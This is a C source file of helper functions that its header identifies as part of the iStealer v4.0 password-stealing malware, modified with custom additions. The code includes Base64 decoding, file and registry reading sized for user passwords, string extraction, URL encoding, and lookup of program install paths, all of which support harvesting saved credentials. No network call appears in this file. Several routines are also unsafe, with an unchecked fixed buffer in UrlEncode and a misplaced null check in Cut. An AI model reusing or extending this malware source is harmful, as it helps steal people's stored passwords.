// functions.c - iStealer v4.0 - Kizar Labs 2009 [modified] + custom functions
//
//////////////////////////////////////////////////////////////////////

#include "functions.h"
#include "Config.h"


void Base64Decode(int none, char *szInput, char *szOutput)
{
	char enc[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	char dec[256];
	unsigned long dwInLen, dwOutLen;
	unsigned int i, j, adjust;

	j = adjust = 0;

	for (i=0; i<256; i++)
		dec[i] = 64;
	for (i=0; i<64; i++)
		dec[enc[i]] = i;

	dwInLen = strlen(szInput);
	if (szInput[dwInLen-1] == 61) {
		adjust++;
		if (szInput[dwInLen-2] == 61) 
			adjust++;
	}
	dwOutLen = (dwInLen * 3) / 4 - adjust;

    for (i=0; i<dwInLen; i+=4) {
		szOutput[j] = (dec[szInput[i]] << 2) + ((dec[szInput[i + 1]] & 0x30) >> 4); j++;
		szOutput[j] = ((dec[szInput[i + 1]] & 0xf) << 4) + ((dec[szInput[i + 2]] & 0x3c) >> 2); j++;
		szOutput[j] = ((dec[szInput[i + 2]] & 0x3) << 6) + dec[szInput[i + 3]]; j++;
	}
	szOutput[dwOutLen] = 0;
}


int ReadFileData(char *filePath, char **buffer, DWORD *bufferSize)
{
	FILE * hFile;
	DWORD fSize;

	hFile = fopen(filePath, "rb");
	if (hFile == NULL)
		return 0;

	fseek(hFile, 0, SEEK_END);
	fSize = ftell(hFile);
	fseek(hFile, 0, SEEK_SET);
	*buffer = (char *)malloc(fSize);
	if (*buffer == NULL)
		return 0;

	fread(*buffer, fSize, 1, hFile);
	fclose(hFile);
	*bufferSize = fSize;

	return 1;
}


int FileSize(char *filePath)
{
	FILE * hFile;
	DWORD fSize;

	hFile = fopen(filePath, "rb");
	if (hFile == NULL)
		return 0;

	fseek(hFile, 0, SEEK_END);
	fSize = ftell(hFile);
	fclose(hFile);

	return fSize;
}


int ReadKeyData(HKEY hKey, char *subKey, char *value, char *buffer)
{
	HKEY rKey;
	DWORD lpType = REG_SZ, lpcbData = UserPasswordLength;
	if (RegOpenKeyExA(hKey, subKey, 0, KEY_READ, &rKey) == ERROR_SUCCESS)
    {
		if (RegQueryValueExA(rKey, value, 0, &lpType, (unsigned char *)buffer, &lpcbData) == ERROR_SUCCESS)
        {
			RegCloseKey(rKey);
			if (lpcbData == 0 || lpcbData == 1)
				return 0;
			else
				return 1;
		}
        else
        {
			RegCloseKey(rKey);
		}
	}
	return 0;
}


unsigned long FindString(char *buffer, unsigned long bufferlen, char *string, unsigned long start)
{
	unsigned long i, stringlen;
	stringlen = strlen(string);
    for (i=start; i<bufferlen-stringlen; i++)
    { 
        if (memcmp(&buffer[i], string, stringlen) == 0)
			return i; 
    }
    return 0;
}


int GetLine(unsigned long *start, char *buffer, unsigned long bufferlen, char *find, char *output)
{
	unsigned long i, b;
	unsigned short findlen = strlen(find);
    for (i=*start; i<bufferlen-findlen; i++) {
        if (memcmp(&buffer[i], find, findlen) == 0) {
			for (b=i; b<bufferlen-2; b++) {
				if (buffer[b] == 0x0D) {
					strncpy(output, &buffer[i+findlen], b-i-findlen);
					output[b-i-findlen] = 0;
					*start = b;
					return 1;
				}
			}
			return 0;
		}
    }
    return 0;
}


char *UrlEncode(char *string)
{
	unsigned long i;
	unsigned char url[200];
	strcpy((char *)url, string);
	string[0] = 0;
	for (i=0; i<strlen((char *)url); i++) {
		sprintf(string, "%s%%%02X", string, url[i]);
	}
	return string;
}



// custom developed functions


int GetPathFromRegistryEntry(char * Path, HKEY Key, char * SubKey, char * Value)
{
    char *lFFPath = NULL;
    DWORD lValueType;
    HKEY lValueKey = NULL;
    int lCounter = 0;

    if(RegOpenKeyExA(Key, SubKey, 0, KEY_READ, &lValueKey) != ERROR_SUCCESS)
        return false;

    DWORD lPathSize = MAX_PATH;
    if(RegQueryValueExA(lValueKey, Value, 0,  &lValueType, (unsigned char*) Path, &lPathSize) != ERROR_SUCCESS)
    {
        RegCloseKey(lValueKey);
        return false;
    }
    RegCloseKey(lValueKey);
    if (lPathSize <= 0 || Path[0] == 0)
        return false;

    // This path may contain extra double quote....
    if(Path[0] == '\"')
        for(lCounter = 0; lCounter < (int) strlen(Path) - 1 ; lCounter++)
            Path[lCounter] = Path[lCounter + 1];

    // Terminate the string at last "\\"
    *(strrchr(Path, '\\') + 1) = 0;

    return true;
}


int Cut(char * Output, char * SearchIn, char * Delimiter1, char * Delimiter2)
{
    char * Position1 = strstr(SearchIn, Delimiter1) + strlen(Delimiter1);
    if (!Position1)
        return 0;

    char * Position2 = strstr(/*SearchIn*/Position1, Delimiter2);
    if (!Position2 || (Position1 > Position2))
        return 0;

    DWORD Count = Position2 - Position1;
    strncpy(Output, Position1, Count);
    Output[Count] = '\0';

    return 1;
}

